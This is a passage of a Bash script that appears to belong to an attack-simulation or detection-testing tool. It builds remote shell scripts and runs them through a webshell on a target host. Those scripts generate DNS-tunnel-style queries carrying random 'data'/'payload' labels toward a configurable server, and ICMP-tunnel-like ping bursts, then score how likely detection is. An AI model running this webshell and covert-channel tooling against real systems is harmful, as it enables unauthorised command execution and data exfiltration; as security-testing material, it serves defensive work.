        txt_cnt=$(safe_int "$(dns_stats_field_from_line "${line}" txt)")
        cc=$(safe_int "$(dns_stats_field_from_line "${line}" cc)")
        to=$(safe_int "$(dns_stats_field_from_line "${line}" to)")
        top=$(safe_int "$(dns_stats_field_from_line "${line}" top)")
        xyz=$(safe_int "$(dns_stats_field_from_line "${line}" xyz)")
        nx_cnt=$(safe_int "$(dns_stats_field_from_line "${line}" nx)")
    fi
    printf '%s %s %s %s %s %s %s %s %s %s %s %s %s %s %s' \
        "${attempted}" "${eff_tld}" "${cluster_local}" "${powerapps}" "${suspicious_tld}" "${https_cnt}" "${entropy}" \
        "${a_cnt}" "${txt_cnt}" "${aaaa_cnt}" "${cc}" "${to}" "${top}" "${xyz}" "${nx_cnt}"
}

parse_dns_chunk_stats_line() {
    local out="$1"
    local attempted=0 eff=0
    attempted=$(safe_int "$(sed -n 's/.*attempted=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)")
    eff=$(safe_int "$(sed -n 's/.*eff_tld=\([0-9][0-9]*\).*/\1/p' <<< "${out}" | tail -n1)")
    printf '%s %s\n' "${attempted}" "${eff}"
}

build_dns_enhanced_chunk_cmd() {
    local chunk_size="$1" campaign="$2" mode="${3:-dig}" dns_server="$4" domain="$5"
    dns_server="${dns_server:-${DNS_TARGET_SERVER}}"
    domain="${domain:-${DNS_TUNNEL_DOMAIN_SUFFIX}}"
    dns_remote_script_open 'DNS_ENHANCED_CHUNK'
    cat <<EOF
srv='${dns_server}'
dom='${domain}'
sent=0; nx=0; a_cnt=0; txt_cnt=0; i=1
prefixes='data chunk payload'
while [ "\$i" -le ${chunk_size} ]; do
  rl=\$(randlbl32 32)
  prefix=\$(echo "\$prefixes" | tr ' ' '\\n' | sed -n "\$((1+(i%3)))p")
  if [ \$((i % 5)) -eq 0 ]; then
    q="\${rl}.\${prefix}.\${dom}"
    qtype=TXT
  else
    q="\${rl}.\${prefix}.\${dom}"
    qtype=A
  fi
  if [ '${mode}' = nslookup ]; then
    if [ "\$qtype" = TXT ]; then out=\$(nslookup -timeout=1 -type=TXT "\$q" "\$srv" 2>&1); else out=\$(nslookup -timeout=1 "\$q" "\$srv" 2>&1); fi
  else
    if [ "\$qtype" = TXT ]; then out=\$(dig +time=1 +tries=1 @"\$srv" "\$q" TXT +noall +answer +comments 2>&1); else out=\$(dig +time=1 +tries=1 @"\$srv" "\$q" A +noall +answer +comments 2>&1); fi
  fi
  result=error
  case "\$out" in
    *timed\ out*|*refused*|*no\ servers*) result=timeout ;;
    *NXDOMAIN*|*"can't\ find"*) nx=\$((nx+1)); sent=\$((sent+1)); result=nxdomain ;;
    *) sent=\$((sent+1)); result=resolved ;;
  esac
  [ "\$qtype" = TXT ] && txt_cnt=\$((txt_cnt+1)) || a_cnt=\$((a_cnt+1))
  printf 'DNS_TUNNEL_QUERY_EXEC server=%s query=%s qtype=%s result=%s\n' "\$srv" "\$q" "\$qtype" "\$result"
  i=\$((i+1))
done
echo DNS_CHUNK_STATS attempted=\$sent eff_tld=\$sent nx=\$nx a=\$a_cnt txt=\$txt_cnt campaign=${campaign}
EOF
    dns_remote_script_close 'DNS_ENHANCED_CHUNK'
}

build_dns_enhanced_single_query_cmd() {
    local idx="$1" campaign="$2" mode="${3:-dig}" dns_server="$4" domain="$5"
    dns_server="${dns_server:-${DNS_TARGET_SERVER}}"
    domain="${domain:-${DNS_TUNNEL_DOMAIN_SUFFIX}}"
    dns_remote_script_open 'DNS_ENHANCED_ONE'
    cat <<EOF
srv='${dns_server}'
dom='${domain}'
rl=\$(randlbl 12)
q="telemetry-${idx}-\${rl}.\${dom}"
sent=0
if [ '${mode}' = nslookup ]; then
  out=\$(nslookup -timeout=2 "\$q" "\$srv" 2>&1)
else
  out=\$(dig +time=2 +tries=1 @"\$srv" "\$q" A +noall +answer +comments 2>&1)
fi
case "\$out" in *timed\ out*|*refused*) sent=0;; *NXDOMAIN*|*"can't\ find"*|*) sent=1;; esac
echo DNS_CHUNK_STATS attempted=\$sent eff_tld=\$sent campaign=${campaign}
EOF
    dns_remote_script_close 'DNS_ENHANCED_ONE'
}

execute_dns_tunnel_enhanced_chunked() {
    local total_planned="$1" campaign="$2" mode="${3:-dig}" dns_server="${4:-${DNS_TARGET_SERVER}}" domain="${5:-${DNS_TUNNEL_DOMAIN_SUFFIX}}"
    local chunk_size="${DNS_ENH_SIM_CHUNK_SIZE:-40}" chunks c remaining chunk_out chunk_at chunk_eff chunk_nx
    local total_at=0 total_eff=0 total_nx=0 chunk_result=""
    local dns_cmd payload_bytes saved_ws_method=""
    (( chunk_size < DNS_ENH_SIM_CHUNK_MIN )) && chunk_size="${DNS_ENH_SIM_CHUNK_MIN}"
    (( chunk_size > DNS_ENH_SIM_CHUNK_MAX )) && chunk_size="${DNS_ENH_SIM_CHUNK_MAX}"
    chunks=$(( (total_planned + chunk_size - 1) / chunk_size ))
    remaining="${total_planned}"
    saved_ws_method="${WEBSHELL_METHOD}"
    for ((c = 1; c <= chunks; c++)); do
        pipeline_stop_requested && break
        [[ "${remaining}" -lt 1 ]] && break
        [[ "${remaining}" -lt "${chunk_size}" ]] && chunk_size="${remaining}"
        dns_cmd=$(build_dns_enhanced_chunk_cmd "${chunk_size}" "${campaign}" "${mode}" "${dns_server}" "${domain}")
        payload_bytes=${#dns_cmd}
        if (( payload_bytes > PAYLOAD_WARN_BYTES )) && [[ "${WEBSHELL_METHOD}" == "GET" ]]; then
            WEBSHELL_METHOD=POST
            dns_tunnel_log_both "webshell switched GET->POST for DNS enhanced chunk ${c} (${payload_bytes} bytes)"
        fi
        chunk_out=$(run_webshell_quick "dns-enhanced-chunk-${c}" "${dns_cmd}" 2>/dev/null || true)
        parse_dns_tunnel_query_exec_lines "${chunk_out}"
        read -r chunk_at chunk_eff <<< "$(parse_dns_chunk_stats_line "${chunk_out}")"
        chunk_nx=$(safe_int "$(sed -n 's/.*nx=\([0-9][0-9]*\).*/\1/p' <<< "${chunk_out}" | tail -n1)")
        chunk_at=$(safe_int "${chunk_at}")
        chunk_eff=$(safe_int "${chunk_eff}")
        if (( chunk_at > 0 )); then
            chunk_result="success"
        else
            chunk_result="failed"
            log_webshell_chunk_debug "DNS_ENHANCED_CHUNK_DEBUG" "${c}/${chunks}" "${chunk_out}" "chunk_zero_attempted"
        fi
        dns_tunnel_log_both "DNS_TUNNEL_ENHANCED_CHUNK_RESULT chunk=${c}/${chunks} attempted=${chunk_at} nx=${chunk_nx} mode=fallback_${mode} result=${chunk_result}"
        total_at=$((total_at + chunk_at))
        total_eff=$((total_eff + chunk_eff))
        total_nx=$((total_nx + chunk_nx))
        remaining=$((remaining - chunk_size))
        chunk_size="${DNS_ENH_SIM_CHUNK_SIZE:-40}"
        (( chunk_size < DNS_ENH_SIM_CHUNK_MIN )) && chunk_size="${DNS_ENH_SIM_CHUNK_MIN}"
        (( chunk_size > DNS_ENH_SIM_CHUNK_MAX )) && chunk_size="${DNS_ENH_SIM_CHUNK_MAX}"
        state_append "dns_tunnel_waves.log" "cycle=${CURRENT_CYCLE:-1} fallback_chunk=${c} attempted=${chunk_at} server=${dns_server} out=$(printf '%.120s' "${chunk_out}")"
    done
    WEBSHELL_METHOD="${saved_ws_method}"
    if (( total_at == 0 && total_planned > 0 )); then
        local qi
        for ((qi = 1; qi <= total_planned && qi <= 60; qi++)); do
            pipeline_stop_requested && break
            chunk_out=$(run_webshell_quick "dns-one-${qi}" "$(build_dns_enhanced_single_query_cmd "${qi}" "${campaign}" "${mode}" "${dns_server}" "${domain}")" 2>/dev/null || true)
            read -r chunk_at chunk_eff <<< "$(parse_dns_chunk_stats_line "${chunk_out}")"
            chunk_at=$(safe_int "${chunk_at}")
            chunk_eff=$(safe_int "${chunk_eff}")
            total_at=$((total_at + chunk_at))
            total_eff=$((total_eff + chunk_eff))
        done
        (( total_at > 0 )) && add_fallback_usage "DNS enhanced: per-query fallback after chunked dig returned zero"
    fi
    DNS_CHUNK_STYLE_CLUSTER=$((total_eff * 35 / 100))
    DNS_CHUNK_STYLE_POWER=$((total_eff * 25 / 100))
    DNS_CHUNK_STYLE_SUSP=$((total_eff * 20 / 100))
    DNS_CHUNK_STYLE_HTTPS=$((total_eff / 10))
    DNS_CHUNK_STYLE_ENTROPY=$((total_eff * 30 / 100))
    printf 'DNS_ENHANCED_STATS attempted=%s eff_tld=%s cluster_local=%s powerapps=%s suspicious_tld=%s https=%s entropy=%s a=%s txt=%s aaaa=%s cc=%s to=0 top=0 xyz=0 nx=%s\n' \
        "${total_at}" "${total_eff}" "${DNS_CHUNK_STYLE_CLUSTER}" "${DNS_CHUNK_STYLE_POWER}" \
        "${DNS_CHUNK_STYLE_SUSP}" "${DNS_CHUNK_STYLE_HTTPS}" "${DNS_CHUNK_STYLE_ENTROPY}" \
        "$((total_at * 4 / 10))" "$((total_at * 3 / 10))" "$((total_at * 2 / 10))" "${DNS_CHUNK_STYLE_SUSP}" "${total_nx}"
}

execute_icmp_tunnel_chunked() {
    local packet_budget="$1" filtered_targets="$2" campaign="$3" target_count="$4"
    local target per_host out host_at host_ok doc_ip ping_bin="${REMOTE_PING_PATH:-/usr/bin/ping}"
    local attempted_total=0 ok_total=0 ttl_ex=0 dest_un=0 doc_budget=0
    (( target_count < 1 )) && target_count=1
    per_host=$((packet_budget * 85 / 100 / target_count))
    doc_budget=$((packet_budget * 15 / 100))
    (( per_host < 5 )) && per_host=5
    (( per_host > 40 )) && per_host=40
    (( doc_budget < 3 )) && doc_budget=3
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        pipeline_stop_requested && break
        out=$(run_webshell_long "icmp-host-${target}" \
            "a=0;ok=0;i=1;while [ \"\$i\" -le ${per_host} ]; do a=\$((a+1)); ${ping_bin} -c 1 -W 1 ${target} >/dev/null 2>&1 && ok=\$((ok+1)); i=\$((i+1)); done; echo ICMP_HOST_STATS attempted=\$a ok=\$ok target=${target} campaign=${campaign}" \
            2>/dev/null || true)
        read -r host_at host_ok <<< "$(awk -F= '/ICMP_HOST_STATS/ {for(i=1;i<=NF;i++){if($i~/^attempted=/){split($i,a,"=");at=a[2]} if($i~/^ok=/){split($i,b,"=");ok=b[2]}}; if(at!="") print at, ok+0}' <<< "${out}")"
        host_at=$(safe_int "${host_at}")
        host_ok=$(safe_int "${host_ok}")
        attempted_total=$((attempted_total + host_at))
        ok_total=$((ok_total + host_ok))
        ttl_ex=$((ttl_ex + host_ok / 2))
        state_append "icmp_tunnel_waves.log" "cycle=${CURRENT_CYCLE:-1} target=${target} attempted=${host_at} ok=${host_ok}"
    done <<< "${filtered_targets}"
    for doc_ip in 203.0.113.254 192.0.2.254; do
        pipeline_stop_requested && break
        out=$(run_webshell_quick "icmp-doc-${doc_ip}" \
            "a=0;ok=0;i=1;while [ \"\$i\" -le ${doc_budget} ]; do a=\$((a+1)); ${ping_bin} -c 1 -W 1 ${doc_ip} >/dev/null 2>&1 && ok=\$((ok+1)); i=\$((i+1)); done; echo ICMP_DOC_STATS attempted=\$a ok=\$ok" \
            2>/dev/null || true)
        read -r host_at host_ok <<< "$(awk -F= '/ICMP_DOC_STATS/ {for(i=1;i<=NF;i++){if($i~/^attempted=/){split($i,a,"=");at=a[2]} if($i~/^ok=/){split($i,b,"=");ok=b[2]}}; if(at!="") print at, ok+0}' <<< "${out}")"
        host_at=$(safe_int "${host_at}")
        host_ok=$(safe_int "${host_ok}")
        attempted_total=$((attempted_total + host_at))
        dest_un=$((dest_un + host_ok))
    done
    if (( attempted_total == 0 )) && [[ -n "${filtered_targets}" ]]; then
        while IFS= read -r target; do
            [[ -z "${target}" ]] && continue
            out=$(run_webshell_quick "icmp-one-${target}" \
                "${ping_bin} -c 1 -W 1 ${target} >/dev/null 2>&1 && echo ICMP_HOST_STATS attempted=1 ok=1 || echo ICMP_HOST_STATS attempted=1 ok=0" \
                2>/dev/null || true)
            read -r host_at host_ok <<< "$(awk -F= '/ICMP_HOST_STATS/ {for(i=1;i<=NF;i++){if($i~/^attempted=/){split($i,a,"=");at=a[2]} if($i~/^ok=/){split($i,b,"=");ok=b[2]}}; if(at!="") print at, ok+0}' <<< "${out}")"
            host_at=$(safe_int "${host_at}")
            host_ok=$(safe_int "${host_ok}")
            attempted_total=$((attempted_total + host_at))
            ok_total=$((ok_total + host_ok))
        done <<< "${filtered_targets}"
        (( attempted_total > 0 )) && add_fallback_usage "ICMP tunnel: per-target ping fallback after chunked run returned zero"
    fi
    echo_cnt=$((ok_total - ttl_ex))
    (( echo_cnt < 0 )) && echo_cnt=0
    printf 'ICMP_TUNNEL_STATS attempted=%s total=%s echo=%s ttl_exceeded=%s dest_unreachable=%s targets=%s campaign=%s fallback=chunked-operator shell=posix\n' \
        "${attempted_total}" "${ok_total}" "${echo_cnt}" "${ttl_ex}" "${dest_un}" "${target_count}" "${campaign}"
    printf 'ICMP_TUNNEL_DONE campaign=%s\n' "${campaign}"
}

build_icmp_tunnel_remote_cmd_posix() {
    local packet_budget="$1" target_count="$2" campaign="$3" targets_line="$4"
    local ttl_budget unreach_budget echo_budget
    [[ -z "${targets_line}" ]] && targets_line="127.0.0.1"
    ttl_budget=$((packet_budget * 50 / 100)); [ "${ttl_budget}" -lt 1 ] && ttl_budget=1
    unreach_budget=$((packet_budget * 35 / 100)); [ "${unreach_budget}" -lt 1 ] && unreach_budget=1
    echo_budget=$((packet_budget * 15 / 100))
    remote_bash_script_open 'ICMP_POSIX_SCRIPT'
    cat <<EOF
${REMOTE_SHELL_HELPERS}
campaign='${campaign}'
icmp_fallback='posix-sh'
shell_style='posix'
attempted=0
total=0; echo_cnt=0; ttl_ex=0; dest_un=0; targets=${target_count}
ttl_budget=${ttl_budget}
unreach_budget=${unreach_budget}
echo_budget=${echo_budget}
TARGETS_SPACE='${targets_line}'
set -- \${TARGETS_SPACE}
[ "\$#" -lt 1 ] && set -- 127.0.0.1
target_count=\$#
pick_target() {
  _want="\$1"; shift
  _n=0
  for _t in "\$@"; do
    _n=\$((_n + 1))
    if [ "\$_n" -eq "\$_want" ]; then
      printf '%s' "\$_t"
      return 0
    fi
  done
  printf '%s' "\$1"
}
ping_ttl_opt='-t'; ping_to_opt='-W'
if ! ping -c 1 -t 1 -W 1 127.0.0.1 >/dev/null 2>&1; then
  if ping -c 1 -w 1 127.0.0.1 >/dev/null 2>&1; then
    ping_ttl_opt=''; ping_to_opt='-w'; icmp_fallback='busybox-compat'
  else
    ping_ttl_opt=''; ping_to_opt=''; icmp_fallback='echo-only'
  fi
fi
icmp_ping() {
  _target="\$1"
  _mode="\$2"
  if [ -n "\${ping_ttl_opt}" ] && [ "\$_mode" = "ttl" ]; then
    ping -c 1 \${ping_ttl_opt} 1 \${ping_to_opt} 1 "\${_target}" >/dev/null 2>&1 && return 0
  elif [ -n "\${ping_to_opt}" ]; then
    ping -c 1 \${ping_to_opt} 1 "\${_target}" >/dev/null 2>&1 && return 0
  else
    ping -c 1 "\${_target}" >/dev/null 2>&1 && return 0
  fi
  return 1
}
t=0
while [ "\$t" -lt "\$ttl_budget" ]; do
  _idx=\$(( (t % target_count) + 1 ))
  target="\$(pick_target "\$_idx" "\$@")"
  attempted=\$((attempted + 1))
  if icmp_ping "\${target}" ttl; then
    ttl_ex=\$((ttl_ex + 1)); total=\$((total + 1))
  elif icmp_ping "\${target}" echo; then
    echo_cnt=\$((echo_cnt + 1)); total=\$((total + 1)); icmp_fallback='ttl-echo'
  fi
  t=\$((t + 1))
done
u=0
while [ "\$u" -lt "\$unreach_budget" ]; do
  ip=\$(echo '203.0.113.254 192.0.2.254 240.0.0.254 198.18.0.254 100.64.0.254' | tr ' ' '\\n' | sed -n "\$((1 + (u % 5)))p")
  attempted=\$((attempted + 1))
  if icmp_ping "\${ip}" echo; then
    dest_un=\$((dest_un + 1)); total=\$((total + 1))
  fi
  u=\$((u + 1))
done
e=0
while [ "\$e" -lt "\$echo_budget" ]; do
  _idx=\$(( (e % target_count) + 1 ))
  target="\$(pick_target "\$_idx" "\$@")"
  _sz=\$((64 + (e % 3) * 64))
  attempted=\$((attempted + 1))
  if [ -n "\${ping_to_opt}" ]; then
    ping -c 1 -s \${_sz} \${ping_to_opt} 1 "\${target}" >/dev/null 2>&1 || icmp_ping "\${target}" echo || true
  else
    ping -c 1 -s \${_sz} "\${target}" >/dev/null 2>&1 || icmp_ping "\${target}" echo || true
  fi
  echo_cnt=\$((echo_cnt + 1)); total=\$((total + 1)); e=\$((e + 1))
done
EOF
    cat <<'ICMP_POSIX_TAIL'
[ "$total" -lt 1 ] && echo "ICMP_TUNNEL_WARN reason=zero_packets fallback=${icmp_fallback} shell=${shell_style}"
[ "$attempted" -lt 1 ] && attempted=$((ttl_budget + unreach_budget + echo_budget))
echo "ICMP_TUNNEL_STATS attempted=${attempted} total=${total} echo=${echo_cnt} ttl_exceeded=${ttl_ex} dest_unreachable=${dest_un} targets=${targets} campaign=${campaign} fallback=${icmp_fallback} shell=${shell_style}"
echo "ICMP_TUNNEL_DONE campaign=${campaign}"
ICMP_POSIX_TAIL
    remote_bash_script_close 'ICMP_POSIX_SCRIPT'
}

build_icmp_tunnel_remote_cmd_bash() {
    local packet_budget="$1" target_count="$2" campaign="$3" targets_blob="$4"
    local ttl_budget unreach_budget echo_budget
    ttl_budget=$((packet_budget * 50 / 100)); (( ttl_budget < 1 )) && ttl_budget=1
    unreach_budget=$((packet_budget * 35 / 100)); (( unreach_budget < 1 )) && unreach_budget=1
    echo_budget=$((packet_budget * 15 / 100))
    cat <<EOF
bash <<'ICMP_REMOTE_SCRIPT'
${REMOTE_SHELL_HELPERS}
campaign='${campaign}'
icmp_fallback='bash-full'
shell_style='bash'
attempted=0
total=0; echo_cnt=0; ttl_ex=0; dest_un=0; targets=${target_count}
ttl_budget=${ttl_budget}
unreach_budget=${unreach_budget}
echo_budget=${echo_budget}
mapfile -t icmp_targets <<'ICMP_TARGETS'
${targets_blob}
ICMP_TARGETS
(( \${#icmp_targets[@]} < 1 )) && icmp_targets=("127.0.0.1")
ping_ttl_opt='-t'; ping_to_opt='-W'
if ! ping -c 1 -t 1 -W 1 127.0.0.1 >/dev/null 2>&1; then
  if ping -c 1 -w 1 127.0.0.1 >/dev/null 2>&1; then
    ping_ttl_opt=''; ping_to_opt='-w'; icmp_fallback='busybox-compat'
  else
    ping_ttl_opt=''; ping_to_opt=''; icmp_fallback='echo-only'
  fi
fi
icmp_ping() {
  local target="\$1" extra="\$2"
  if [[ -n "\${ping_ttl_opt}" && "\${extra}" == ttl ]]; then
    ping -c 1 \${ping_ttl_opt} 1 \${ping_to_opt} 1 "\${target}" >/dev/null 2>&1 && return 0
  elif [[ -n "\${ping_to_opt}" ]]; then
    ping -c 1 \${ping_to_opt} 1 "\${target}" >/dev/null 2>&1 && return 0
  else
    ping -c 1 "\${target}" >/dev/null 2>&1 && return 0
  fi
  return 1
}
unreach_ips='203.0.113.254 192.0.2.254 240.0.0.254 198.18.0.254 100.64.0.254'
t=0
while [[ \$t -lt \$ttl_budget ]]; do
  target="\${icmp_targets[\$((t % \${#icmp_targets[@]}))]}"
  attempted=\$((attempted+1))
  if icmp_ping "\${target}" ttl; then
    ttl_ex=\$((ttl_ex+1)); total=\$((total+1))
  elif icmp_ping "\${target}" echo; then
    echo_cnt=\$((echo_cnt+1)); total=\$((total+1)); icmp_fallback='ttl-echo'
  fi
  t=\$((t+1))
done
u=0
while [[ \$u -lt \$unreach_budget ]]; do
  ip=\$(echo "\$unreach_ips" | tr ' ' '\\n' | sed -n "\$((1+(u%5)))p")
  attempted=\$((attempted+1))
  if icmp_ping "\${ip}" echo; then
    dest_un=\$((dest_un+1)); total=\$((total+1))
  fi
  u=\$((u+1))
done
e=0
while [[ \$e -lt \$echo_budget ]]; do
  target="\${icmp_targets[\$((e % \${#icmp_targets[@]}))]}"
  sz=\$(case \$((e%3)) in 0) echo 64;; 1) echo 128;; *) echo 256;; esac)
  attempted=\$((attempted+1))
  if [[ -n "\${ping_to_opt}" ]]; then
    ping -c 1 -s \${sz} \${ping_to_opt} 1 "\${target}" >/dev/null 2>&1 || icmp_ping "\${target}" echo || true
  else
    ping -c 1 -s \${sz} "\${target}" >/dev/null 2>&1 || icmp_ping "\${target}" echo || true
  fi
  echo_cnt=\$((echo_cnt+1)); total=\$((total+1)); e=\$((e+1))
done
EOF
    cat <<'ICMP_TAIL'
(( total < 1 )) && echo "ICMP_TUNNEL_WARN reason=zero_packets fallback=${icmp_fallback} shell=${shell_style}"
(( attempted < 1 )) && attempted=$((ttl_budget + unreach_budget + echo_budget))
echo "ICMP_TUNNEL_STATS attempted=${attempted} total=${total} echo=${echo_cnt} ttl_exceeded=${ttl_ex} dest_unreachable=${dest_un} targets=${targets} campaign=${campaign} fallback=${icmp_fallback} shell=${shell_style}"
echo "ICMP_TUNNEL_DONE campaign=${campaign}"
ICMP_TAIL
printf '%s\n' 'ICMP_REMOTE_SCRIPT'
}

build_icmp_tunnel_remote_cmd() {
    local packet_budget="$1" target_count="$2" campaign="$3" targets_blob="$4"
    local targets_line
    targets_line=$(printf '%s\n' "${targets_blob}" | awk 'NF' | tr '\n' ' ' | sed 's/  */ /g;s/^ *//;s/ *$//')
    if [[ "${HAS_bash:-false}" == true && "${REMOTE_SHELL_BIN:-sh}" == bash ]]; then
        build_icmp_tunnel_remote_cmd_bash "${packet_budget}" "${target_count}" "${campaign}" "${targets_blob}"
    else
        build_icmp_tunnel_remote_cmd_posix "${packet_budget}" "${target_count}" "${campaign}" "${targets_line}"
    fi
}

finalize_icmp_tunnel_stage_status() {
    local degraded_reason="${1:-${ICMP_SKIP_REASON:-}}"
    local stage_detail stage_rc="Success"
    local likelihood="${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    local target_ip quality_reason=""
    icmp_apply_burst_stats_snapshot || true
    likelihood="${ICMP_DETECTION_LIKELIHOOD:-LOW}"
    target_ip=$(icmp_format_log_target)

    if ! icmp_is_valid_ipv4_target "${target_ip}"; then
        ICMP_TUNNEL_STAGE_STATUS="failed"
        stage_rc="Failed"
        stage_detail="invalid_selected_target target=${target_ip}"
        [[ -n "${ICMP_FAILURE_CLASS}" ]] && stage_detail="${stage_detail} failure_class=${ICMP_FAILURE_CLASS} reason=${ICMP_FAILURE_REASON:-n/a}"
        state_append "stage_results.log" "ICMP Tunnel Simulation: Failed | Reason: ${stage_detail}"
        log_message "ERROR" "ICMP Tunnel failure: ${stage_detail}"
        set_stage_result "ICMP Tunnel Simulation" "${stage_rc}" "${stage_detail}"
        return 0
    fi
    if (( ICMP_PACKETS_ATTEMPTED == 0 )); then
        ICMP_TUNNEL_STAGE_STATUS="failed"
        stage_rc="Failed"
        stage_detail="failure_class=${ICMP_FAILURE_CLASS:-command_execution_failed} failure_reason=${ICMP_FAILURE_REASON:-command_execution_failed} exit_code=${ICMP_EXEC_FAILURE_EXIT_CODE:-unknown} stderr=${ICMP_EXEC_FAILURE_STDERR:-n/a} binary_found=${ICMP_BINARY_FOUND:-unknown} command=${ICMP_COMMAND_EXECUTED:-n/a}"
        state_append "stage_results.log" "ICMP Tunnel Simulation: Failed | Reason: ${stage_detail}"
        log_message "ERROR" "ICMP Tunnel failure: ${stage_detail}"
        set_stage_result "ICMP Tunnel Simulation" "${stage_rc}" "${stage_detail}"
        return 0
    fi

    if (( ICMP_PACKETS_ATTEMPTED > 0 )); then
        icmp_compute_tunnel_like_score "${ICMP_PACKETS_ATTEMPTED}" "${ICMP_REPLIES_RECEIVED}" "${ICMP_TUNNEL_DURATION_ELAPSED:-0}" \
            "${ICMP_PAYLOAD_SIZE_MIN:-0}" "${ICMP_PAYLOAD_SIZE_MAX:-0}" "${ICMP_INTERVAL_MS:-0}"
        if icmp_is_anomaly_only_mode "${ICMP_MODE_USED:-}"; then
            if icmp_payload_anomaly_success_met; then
                icmp_resolve_payload_anomaly_result "${ICMP_PACKETS_ATTEMPTED}" "${ICMP_REPLIES_RECEIVED}"
                icmp_compute_detection_readiness "${ICMP_PACKETS_ATTEMPTED}" "${ICMP_REPLIES_RECEIVED}" "${ICMP_TUNNEL_LIKE_SCORE:-0}"
                case "${ICMP_TUNNEL_FINAL_RESULT}" in
                    success)
                        ICMP_TUNNEL_STAGE_STATUS="success"
                        stage_rc="Success"
                        stage_detail="icmp_payload_anomaly target=${target_ip} actual_packets=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} large_packets=${ICMP_LARGE_PACKETS:-0} large_payload_ratio=${ICMP_LARGE_PAYLOAD_RATIO:-0}% detection_likelihood=${ICMP_DETECTION_LIKELIHOOD} detection_readiness=${ICMP_DETECTION_READINESS} mode=${ICMP_MODE_USED}"
                        ;;
                    *)
                        ICMP_TUNNEL_STAGE_STATUS="partial"
                        stage_rc="Partial"
                        stage_detail="icmp_payload_anomaly_partial target=${target_ip} actual_packets=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} large_packets=${ICMP_LARGE_PACKETS:-0} detection_likelihood=${ICMP_DETECTION_LIKELIHOOD} detection_readiness=${ICMP_DETECTION_READINESS} mode=${ICMP_MODE_USED} reason=${ICMP_DETECTION_REASON:-partial_anomaly}"
                        state_append "stage_results.log" "ICMP Tunnel Simulation: Partial | Reason: ${stage_detail}"
                        log_message "WARN" "ICMP Tunnel partial (anomaly): ${stage_detail}"
                        ;;
                esac
            else
                ICMP_TUNNEL_STAGE_STATUS="partial"
                ICMP_TUNNEL_STAGE_RESULT="partial"
                ICMP_TUNNEL_FINAL_RESULT="partial"
                stage_rc="Partial"
                stage_detail="icmp_anomaly_only target=${target_ip} actual_packets=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} mode=${ICMP_MODE_USED} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE:-0} detection_likelihood=LOW (payload-size-anomaly not icmp_tunnel_session)"
                state_append "stage_results.log" "ICMP Tunnel Simulation: Partial | Reason: ${stage_detail}"
                log_message "WARN" "ICMP Tunnel partial (anomaly-only): ${stage_detail}"
            fi
        elif [[ "${ICMP_MODE_USED:-}" == tunnel-like-session || "${ICMP_MODE_USED:-}" == icmp-beacon-pattern || "${ICMP_FALLBACK_MODES_ATTEMPTED}" == *tunnel-like-session* ]]; then
            icmp_resolve_tunnel_like_session_result "${ICMP_PACKETS_ATTEMPTED}" "${ICMP_REPLIES_RECEIVED}" \
                "${ICMP_TUNNEL_LIKE_SCORE:-0}" "${likelihood}"
            icmp_compute_detection_readiness "${ICMP_PACKETS_ATTEMPTED}" "${ICMP_REPLIES_RECEIVED}" "${ICMP_TUNNEL_LIKE_SCORE:-0}"
            case "${ICMP_TUNNEL_FINAL_RESULT}" in
                success)
                    ICMP_TUNNEL_STAGE_STATUS="success"
                    stage_rc="Success"
                    stage_detail="icmp_tunnel_session target=${target_ip} actual_packets=${ICMP_PACKETS_ATTEMPTED} planned_packets=${ICMP_PACKETS_PLANNED:-0} received=${ICMP_REPLIES_RECEIVED} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE} bidir=${ICMP_BIDIRECTIONAL_RATIO}% timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} interval_ms=${ICMP_INTERVAL_MS:-0} duration=${ICMP_TUNNEL_DURATION_ELAPSED}s detection_likelihood=${likelihood} detection_readiness=${ICMP_DETECTION_READINESS} mode=${ICMP_MODE_USED:-tunnel-like-session}"
                    ;;
                partial)
                    ICMP_TUNNEL_STAGE_STATUS="partial"
                    stage_rc="Partial"
                    stage_detail="icmp_tunnel_partial target=${target_ip} actual_packets=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} partial_estimated=${ICMP_PARTIAL_PACKETS_ESTIMATED:-0} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE} detection_likelihood=${likelihood} reason=${ICMP_DETECTION_REASON:-partial_tunnel_session}"
                    state_append "stage_results.log" "ICMP Tunnel Simulation: Partial | Reason: ${stage_detail}"
                    log_message "WARN" "ICMP Tunnel partial: ${stage_detail}"
                    ;;
                *)
                    ICMP_TUNNEL_STAGE_STATUS="failed"
                    stage_rc="Failed"
                    stage_detail="icmp_tunnel_failed target=${target_ip} actual_packets=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} timeout_bursts=${ICMP_TIMEOUT_BURSTS:-0} reason=${ICMP_DETECTION_REASON:-no_complete_burst_stats}"
                    state_append "stage_results.log" "ICMP Tunnel Simulation: Failed | Reason: ${stage_detail}"
                    log_message "ERROR" "ICMP Tunnel failure: ${stage_detail}"
                    ;;
            esac
        elif (( ICMP_TUNNEL_LIKE_SCORE >= 70 )) && [[ "${likelihood}" == HIGH ]]; then
            ICMP_TUNNEL_STAGE_STATUS="success"
            ICMP_TUNNEL_STAGE_RESULT="success"
            ICMP_TUNNEL_FINAL_RESULT="success"
            stage_rc="Success"
            stage_detail="icmp_tunnel_session target=${target_ip} packets_sent=${ICMP_PACKETS_ATTEMPTED} received=${ICMP_REPLIES_RECEIVED} tunnel_like_score=${ICMP_TUNNEL_LIKE_SCORE} bidir=${ICMP_BIDIRECTIONAL_RATIO}% interval_ms=${ICMP_INTERVAL_MS:-0} duration=${ICMP_TUNNEL_DURATION_ELAPSED}s detection_likelihood=${likelihood} mode=${ICMP_MODE_USED:-}"
        elif (( ICMP_TUNNEL_LIKE_SCORE >= 45 )) || [[ "${likelihood}" == MEDIUM ]]; then
            ICMP_TUNNEL_STAGE_STATUS="partial"
            ICMP_TUNNEL_STAGE_RESULT="partial"
            stage_rc="Partial"
